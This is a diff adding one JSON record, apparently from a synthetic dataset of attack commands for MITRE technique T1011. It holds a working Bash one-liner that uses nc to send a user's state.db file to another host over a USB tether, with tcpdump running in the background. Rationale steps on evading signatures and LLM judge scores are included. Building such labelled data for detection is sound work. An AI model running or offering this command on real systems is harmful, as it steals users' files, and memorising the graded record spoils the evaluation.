@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i usb0 -nn tcp port 54177 -U -w /dev/null >/dev/null 2>&1 & nc -s 172.16.42.1 172.16.42.2 54177 < /home/user/.config/state.db",
+  "explanation": "Exfiltrates over a USB RNDIS/ECM tether (usb0) using a rare TCP port with tcpdump monitoring restricted to that flow, leveraging a physical medium distinct from the primary channel (T1011).",
+  "rationale_steps": [
+    "Use usb0 (USB Ethernet) to shift exfil to a separate physical link.",
+    "Pick port 54177 to avoid common service signatures.",
+    "Background tcpdump on usb0 to observe without retaining pcaps.",
+    "Send the target file with nc bound to usb0's IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-9327732c",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash line with valid options, proper redirections, and correct backgrounding separating the tcpdump and nc commands.",
+        "semantic_score": 4,
+        "semantic_justification": "Netcat exfiltrates the file to 172.16.42.2:54177 bound to 172.16.42.1 (presumably on usb0) aligning with the intent, but tcpdump monitoring will typically fail without elevated privileges and there is no scheduling/looping for true automation.",
+        "combined_score": 4.5,
+        "confidence": 0.82,
+        "timestamp": "2025-10-01T03:20:52.609477Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper syntax, balanced quoting, valid flags for both tcpdump and netcat, and correct command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements automated exfiltration by sending the state.db file over TCP port 54177 through a USB interface, though the tcpdump monitoring to /dev/null seems unnecessary and potentially suspicious.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:20:55.822994Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid commands, flags, redirection, and backgrounding syntax for Bash on Linux.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` command semantically attempts the described exfiltration, the `tcpdump` component, as stated for 'monitoring restricted to that flow,' will likely fail due to the specified 'Privilege: None' constraint, and its utility is further reduced by redirecting all output to `/dev/null`.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T05:42:12.905477Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.667,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
